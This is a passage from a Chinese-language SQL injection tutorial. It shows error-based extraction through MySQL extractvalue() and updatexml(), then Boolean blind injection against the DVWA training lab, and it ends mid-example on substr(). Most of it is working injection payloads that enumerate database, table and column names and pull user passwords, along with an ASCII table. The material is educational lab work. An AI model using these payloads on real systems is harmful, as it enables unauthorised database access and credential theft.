<pre class="src src-sql"><span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>,password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id=1 <span style="color: #a020f0;">and</span> extractvalue(1,0x7e);
<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>,password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id=1 <span style="color: #a020f0;">and</span> extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span>()),0x7e));
</pre>
</div>

<p>
由于16进制0x7e就是~，~不属于xpath语法格式，因此报出xpath语法错误。
</p></li>
</ul>

<p>
函数使用格式：extractvalue(XML_document，xpath_string)，作用是从document中返回包含string的字符串，如果string参数不符合xpath的语法就会报错，将查询的结果放在报错信息里，即extractvalue函数报错时会解析SQL语句。
</p>

<p>
注入思路：库名 -&gt; 表名 -&gt; 列名 -&gt; 字段内容
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#29190;&#24211;&#21517;</span>
1<span style="color: #8b2252;">' and extractvalue(1,concat(0x7e,database()));#</span>
<span style="color: #8b2252;"># &#29190;&#34920;&#25968;</span>
<span style="color: #8b2252;">1'</span> and extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> count(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=database())));<span style="color: #b22222;">#</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#29190;&#34920;&#21517; limit 1,1 &#21363;(1, 1+1] &#31532;2&#26465;</span>
1<span style="color: #8b2252;">' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)));#</span>

<span style="color: #8b2252;"># &#29190;&#21015;&#21517;</span>
<span style="color: #8b2252;">1'</span> and extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> column_name from information_schema.columns where <span style="color: #a0522d;">table_name</span>=<span style="color: #8b2252;">'users'</span> limit 0,1)));<span style="color: #b22222;">#</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24471;&#21040;&#29992;&#25143;&#21517;&#23494;&#30721;</span>
1<span style="color: #8b2252;">' and extractvalue(1,concat(0x7e,(select user from users where user_id=1)));#</span>
<span style="color: #8b2252;">1'</span> and extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> password from users where <span style="color: #a0522d;">user_id</span>=1)));<span style="color: #b22222;">#</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">extractvalue&#20989;&#25968;&#33021;&#26597;&#35810;&#30340;&#26368;&#22823;&#38271;&#24230;&#20026;32&#65292;&#22914;&#26524;&#36229;&#20986;32&#20301;&#23383;&#31526;&#65292;&#37027;&#20040;&#23601;&#35201;&#21464;&#21160;&#25340;&#25509;&#39034;&#24207;&#65292;&#25110;&#32773;&#20351;&#29992;substring()&#20989;&#25968;&#25130;&#21462;&#25968;&#25454;</span>
1<span style="color: #8b2252;">' and extractvalue('</span>~<span style="color: #8b2252;">',concat(0x7e,(select password from users where user_id=1)));#</span>
<span style="color: #8b2252;">1'</span> and extractvalue(<span style="color: #8b2252;">'~'</span>,concat((<span style="color: #a020f0;">select</span> password from users where <span style="color: #a0522d;">user_id</span>=1),0x7e));<span style="color: #b22222;">#</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">substring </span>
1<span style="color: #8b2252;">' and extractvalue('</span>~<span style="color: #8b2252;">',concat(0x7e,substring((select password from users where user_id=1),1,31)));#</span>
<span style="color: #8b2252;">1'</span> and extractvalue(<span style="color: #8b2252;">'~'</span>,concat(0x7e,substring((<span style="color: #a020f0;">select</span> password from users where <span style="color: #a0522d;">user_id</span>=1),32,64)));<span style="color: #b22222;">#</span>
</pre>
</div>
<p>
注意： limit是对查询的结果进行输出行数数量限制。 <code>select * from table limit m,n</code> ，(m, m+n] 左开右闭。其中 m 是指记录开始，从 0 开始，表示第一条记录； n 是指从第 m+1 条开始，取 n 条。
extractvalue()
</p>

<p>
<b>2、updatexml()函数</b>
</p>
<ul class="org-ul">
<li>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</li>
<li>作用：改变文档中符合条件的节点的值</li>
<li>语法：
<ul class="org-ul">
<li>updatexml(XML_document，xpath_string，new_value)</li>
<li>第一个参数：是string格式，为XML文档对象的名称</li>
<li>第二个参数：代表路径，xpath格式的字符串例如//title</li>
<li>第三个参数：string格式，替换查找到的符合条件的数据</li>
</ul></li>
<li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li>
<li>例如： <code>select * from test where id = 1 and updatexml(1,0x7e,3);</code> 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
</ul>

<p>
使用格式：updatexml(XML_document，xpath_string，new_value)，作用是将document的中符合string的字符串替换为value的值。同上，这里string参数不符合xpath语法也会报错。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#29190;&#24211;&#21517;</span>
1<span style="color: #8b2252;">' and updatexml(0x7e,concat(0x7e,database()),0x7e);#</span>

<span style="color: #8b2252;"># &#33719;&#21462;&#34920;&#25968;&#37327;</span>
<span style="color: #8b2252;">1'</span> and updatexml(1,concat(0x7e,(<span style="color: #a020f0;">select</span> count(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span>),0x7e),1);<span style="color: #b22222;">#</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#33719;&#21462;&#31532;&#19968;&#20010;&#34920;&#30340;&#21517;&#23383;</span>
1<span style="color: #8b2252;">' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</span>

<span style="color: #8b2252;"># &#33719;&#21462;&#31532;&#20108;&#20010;&#34920;&#30340;&#21517;&#23383;</span>
<span style="color: #8b2252;">1'</span> and updatexml(1,concat(0x7e,(<span style="color: #a020f0;">select</span> table_name from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=database() limit 1,1),0x7e),1);<span style="color: #b22222;">#</span>
</pre>
</div>

<p>
通过以上方法逐步获取列名和字段内容。
</p>
</div>
</div>
<div id="outline-container-h:9570a2be-02f4-4675-aa21-be43371a72bb" class="outline-4">
<h4 id="h:9570a2be-02f4-4675-aa21-be43371a72bb">盲注</h4>
<div class="outline-text-4" id="text-h:9570a2be-02f4-4675-aa21-be43371a72bb">
</div>
<div id="outline-container-h:b83514e8-6a71-4763-b01e-d7c9f7bfe1de" class="outline-5">
<h5 id="h:b83514e8-6a71-4763-b01e-d7c9f7bfe1de">布尔盲注</h5>
<div class="outline-text-5" id="text-h:b83514e8-6a71-4763-b01e-d7c9f7bfe1de">
<p>
只会根据注入信息返回True跟False，没有了之前的查询信息或者报错信息。
</p>

<p>
下面以dvwa靶场，安全等级Low为例讲解
</p>

<p>
<b>1.判断是否存在注入，注入的类型</b>
</p>

<p>
在 dvwa 中 SQL Injection (Blind) 测试
</p>
<ul class="org-ul">
<li>输入1，提示 User ID exists in the database.</li>
<li>输入' ，提示 User ID is MISSING from the database.</li>
</ul>


<figure id="orgc68e0ac">
<img src="./images/Snipaste_2023-06-03_22-13-18.png" alt="Snipaste_2023-06-03_22-13-18.png" width="50%">

</figure>

<p>
不管输入框输入为何内容，页面上只会返回以下2种情形的提示：
</p>

<p>
满足查询条件则返回"User ID exists in the database."，不满足查询条件则返回"User ID is MISSING from the database."；两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注。
</p>

<table>


<colgroup>
<col  class="org-right">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-right">序号</th>
<th scope="col" class="org-left">构造User ID取值的语句</th>
<th scope="col" class="org-left">输出结果</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-right">1</td>
<td class="org-left">1</td>
<td class="org-left">exists</td>
</tr>

<tr>
<td class="org-right">2</td>
<td class="org-left">'</td>
<td class="org-left">MISSING</td>
</tr>

<tr>
<td class="org-right">3</td>
<td class="org-left">1 and 1 = 1 #</td>
<td class="org-left">exists</td>
</tr>

<tr>
<td class="org-right">4</td>
<td class="org-left">1 and 1 = 2 #</td>
<td class="org-left">exists</td>
</tr>

<tr>
<td class="org-right">5</td>
<td class="org-left">1' and 1 = 1 #</td>
<td class="org-left">exists</td>
</tr>

<tr>
<td class="org-right">6</td>
<td class="org-left">1' and 1 = 2 #</td>
<td class="org-left">MISSING</td>
</tr>
</tbody>
</table>

<p>
上面，由语句5和6构造真假条件返回对应不同的结果，可知存在字符型的SQL盲注漏洞。
</p>

<p>
提问:
分别输入 <code>1' and 1 = 1 #</code> 和 <code>1' and 1 = 2 #</code> ，哪一条语句可以独立证明存在SQL 注入？
</p>

<p>
答：
</p>
<ul class="org-ul">
<li>1' and 1 = 1 # 。 如果测试点不存在注入，不管输入哪个均报错。</li>
<li>如果测试点存在注入，输入 1' and 1 = 1 # 不会报错，输入 1' and 1 = 2 # 会报错。</li>
<li>对于用户来说，输入 1' and 1 = 2 #，不管有没有注入始终报错，所以无法独立判断是否存在注入。</li>
</ul>

<p>
<b>2.猜解当前数据库名称</b>
</p>
<p>
:CUSTOM_ID: h:4c65a8d5-2f09-46a8-af5d-7245f5285a05
</p>

<p>
二分法思维
</p>

<p>
1）判断数据库名称的长度（二分法思维）
</p>

<ul class="org-ul">
<li>length() 判断字符串长度</li>
<li>数据库中1为真，0 为假</li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' and length(database())&gt;10;# MISSING</span>
<span style="color: #8b2252;">1'</span> and length(database())&gt;5;<span style="color: #b22222;"># </span><span style="color: #b22222;">MISSING</span>
1<span style="color: #8b2252;">' and length(database())&gt;3;# exists</span>
<span style="color: #8b2252;">1'</span> and length(database())=4;<span style="color: #b22222;"># </span><span style="color: #b22222;">exists</span>
</pre>
</div>

<p>
可判断出当前所连接数据库名称的长度=4
</p>

<p>
2）判断数据库名称的字符组成元素
</p>

<p>
在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后逐个击破。
</p>

<p>
ASCII码对照表: <a href="https://toolhelper.cn/Encoding/ASCII">https://toolhelper.cn/Encoding/ASCII</a>
</p>
<ul class="org-ul">
<li><a href="https://en.wikipedia.org/wiki/ASCII">https://en.wikipedia.org/wiki/ASCII</a></li>
</ul>

<!-- This HTML table template is generated by emacs 31.0.50 -->
<table border="1">
  <tr>
    <td colspan="17" align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ASCII&nbsp;(1977/1986)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;9&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;1&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;2&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;5&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;6&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;7&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;8&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;9&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;A&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;B&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;C&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;D&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;E&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;F&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;0x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;NUL&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;SOH&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;STX&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;ETX&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;EOT&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;ENQ&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;ACK&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;BEL&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;BS&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;HT&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;LF&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;VT&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;FF&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;CR&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;SO&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;SI&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;1x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;DLE&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;DC1&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;DC2&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;DC3&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;DC4&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;NAK&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;SYN&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;ETB&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;CAN&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;EM&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;SUB&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;ESC&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;FS&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;GS&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;RS&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;US&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;2x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;!&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;"&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;$&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;%&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;'&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;(&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;)&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;*&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;+&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;,&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;-&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;.&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;/&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;3x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;1&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;2&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;5&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;6&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;7&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;8&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;9&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;:&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;<&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;=&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;>&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;?&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;4x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;A&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;B&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;C&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;D&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;E&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;F&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;G&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;H&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;I&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;J&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;K&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;L&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;M&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;N&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;O&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;5x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;Q&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;R&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;S&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;T&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;U&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;V&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;W&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;X&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;Y&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;Z&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;[&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;\&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;]&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;^&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;_&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;6x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;a&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;b&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;c&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;d&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;e&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;f&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;g&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;h&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;i&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;j&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;k&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;l&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;m&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;n&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;o&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td align="left" valign="top">
      &nbsp;&nbsp;7x&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;q&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;r&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;s&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;t&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;u&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;v&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;w&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;x&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;y&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;z&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;{&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;|&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;}&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;&nbsp;~&nbsp;&nbsp;
    </td>
    <td align="left" valign="top">
      &nbsp;DEL&nbsp;
    </td>
  </tr>
  <tr>
    <td colspan="17" align="left" valign="top">
      Changed&nbsp;or&nbsp;added&nbsp;in&nbsp;1963&nbsp;version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
  </tr>
  <tr>
    <td colspan="17" align="left" valign="top">
      Changed&nbsp;in&nbsp;both&nbsp;1963&nbsp;version&nbsp;and&nbsp;1965&nbsp;draft&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    </td>
  </tr>
</table>


<p>
用法：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">substr</span>(strings|express,num start,num length);
strings|express&#65306;&#34987;&#25130;&#21462;&#30340;&#23383;&#31526;&#20018;&#25110;&#23383;&#31526;&#20018;&#34920;&#36798;&#24335;&#65307;
start&#20026;&#36215;&#22987;&#20301;&#32622;&#65307;
length&#20026;&#38271;&#24230;&#12290;

<span style="color: #a020f0;">select</span> substr(&#21442;&#25968;1&#65292;&#21442;&#25968;2&#65292;&#21442;&#25968;3) from &#34920;&#21517;
</pre>
</div>

<p>
范例：substr
</p>
<div class="org-src-container">
<pre class="src src-sql">mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color: #8b2252;">'dvwa'</span>,1,1);
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| substr(<span style="color: #8b2252;">'dvwa'</span>,1,1) |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| d                  |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>

mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color: #8b2252;">'dvwa'</span>,2,1);
